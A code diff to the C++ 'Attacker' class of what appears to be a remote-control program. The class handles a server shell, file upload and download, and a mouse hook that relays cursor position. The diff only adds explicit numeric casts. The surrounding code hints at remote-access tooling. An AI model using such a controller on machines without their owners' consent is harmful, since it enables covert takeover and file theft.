@@ -316,7 +316,7 @@ bool Attacker::handleCmd(const std::string& s)
 		else if (param.size() == 2) {
 			short port = 0;
 			try {
-				port = std::stoul(param[1]);
+				port = short(std::stoul(param[1]));
 			}
 			catch (std::exception& e) {
 				tui.printServerShell("invalid argument(s): " + std::string(e.what()) + "\n");
@@ -404,7 +404,7 @@ bool Attacker::handleCmd(const std::string& s)
 
 		uint16_t oId = uint16_t(0);
 		try {
-			oId = std::stoul(param[0]);
+			oId = uint16_t(std::stoul(param[0]));
 		}
 		catch (std::exception& e) {
 			tui.printServerShell("invalid argument(s): " + std::string(e.what()) + "\n");
@@ -429,7 +429,7 @@ bool Attacker::handleCmd(const std::string& s)
 
 		uint16_t oId = uint16_t(0);
 		try {
-			oId = std::stoul(param[0]);
+			oId = uint16_t(std::stoul(param[0]));
 		}
 		catch (std::exception& e) {
 			tui.printServerShell("invalid argument(s): " + std::string(e.what()) + "\n");
@@ -550,7 +550,7 @@ bool Attacker::handleCmd(const std::string& s)
 			tui.printServerShell("invalid source file path\n");
 			return true;
 		}
-		uint32_t numPackets = std::ceil(size / long double(packetSize));
+		uint32_t numPackets = uint32_t(std::ceil(size / long double(packetSize)));
 
 		sf::Packet req;
 		uint16_t reqId = requestId++;
@@ -813,7 +813,7 @@ void Attacker::sendFile(std::string path, uint32_t numPackets) {
 		else 
 			responsesToProcess.erase(reqId);
 
-		tui.setSendingFileProgress(++packetNum * 100 / double(numPackets));
+		tui.setSendingFileProgress(short(++packetNum * 100 / double(numPackets)));
 	}
 
 	//set to "idle"
@@ -864,7 +864,7 @@ void Attacker::getFile(std::string path, std::string ext, uint32_t numPackets)
 		if (!file.write(data, size))
 			break;
 
-		tui.setGettingFileProgress(++packetNum * 100 / double(numPackets));
+		tui.setGettingFileProgress(short(++packetNum * 100 / double(numPackets)));
 	}
 
 	//set to "idle"
@@ -954,8 +954,8 @@ LRESULT CALLBACK Attacker::LowLevelMouseProc(int nCode, WPARAM wParam, LPARAM lP
 			auto size = sf::Vector2f(sf::VideoMode::getDesktopMode().size);
 			auto pos = sf::Vector2f(sf::Mouse::getPosition()).componentWiseDiv(size);
 
-			int x = std::round(std::min(std::max(pos.x, 0.f), 1.f) * (UINT16_MAX - 1));
-			int y = std::round(std::min(std::max(pos.y, 0.f), 1.f) * (UINT16_MAX - 1));
+			int x = int(std::round(std::min(std::max(pos.x, 0.f), 1.f) * (UINT16_MAX - 1)));
+			int y = int(std::round(std::min(std::max(pos.y, 0.f), 1.f) * (UINT16_MAX - 1)));
 
 			sf::Packet p;
 			p << uint16_t(0) << uint8_t(Cmd::SSH_MOUSE_POS) << uint16_t(x) << uint16_t(y);
